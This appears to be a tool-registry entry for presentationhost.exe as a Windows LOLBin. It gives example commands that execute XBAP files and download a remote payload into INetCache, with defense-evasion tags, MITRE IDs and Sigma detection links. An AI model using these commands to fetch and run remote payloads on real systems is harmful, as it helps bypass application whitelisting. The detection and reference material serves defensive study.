---
id: windows-execution-presentationhost
namespace: windows:execution:presentationhost
name: presentationhost
description: 'File is used for executing Browser applications Located at: C:\Windows\System32\Presentationhost.exe;
  C:\Windows\SysWOW64\Presentationhost.exe.'
author: Oddvar Moe
version: 1.0.0
capabilities:
- security.execution.command
- network.transfer.download
platforms:
- windows
risk_level: high
trust_level: community
execution_policy: enabled
architectures:
- amd64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - network_traffic
  - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 16
    network: medium
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: medium
  disk_io: low
allowed-tools:
- presentationhost
parameters: []
features:
- file-system
- local
- network-intensive
- pipes-stdin
- pipes-stdout
execution:
  template: presentationhost
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Executes the target XAML Browser Application (XBAP) file (Execute code
    within XBAP files)
  command: Presentationhost.exe {PATH_ABSOLUTE:.xbap}
- description: It will download a remote payload and place it in INetCache. (Downloads
    payload from remote server)
  command: Presentationhost.exe {REMOTEURL}
references:
- label: ShmooCon-2015-Simple-WLEvasion.pdf
  url: https://github.com/api0cradle/ShmooCon-2015/blob/master/ShmooCon-2015-Simple-WLEvasion.pdf
- label: ''
  url: https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/
techniques:
- execution
- defense-evasion
- exfiltration
mitre_ids:
- T1218
- T1105
detections:
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_presentationhost_download.yml
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_presentationhost.yml
- type: ioc
  description: Execution of .xbap files may not be common on production workstations
install:
- method: choco
  package_name: presentationhost
  commands:
  - choco install presentationhost
---

# presentationhost

presentationhost is a Windows LOLBin. File is used for executing Browser applications Located at: C:\Windows\System32\Presentationhost.exe; C:\Windows\SysWOW64\Presentationhost.exe.
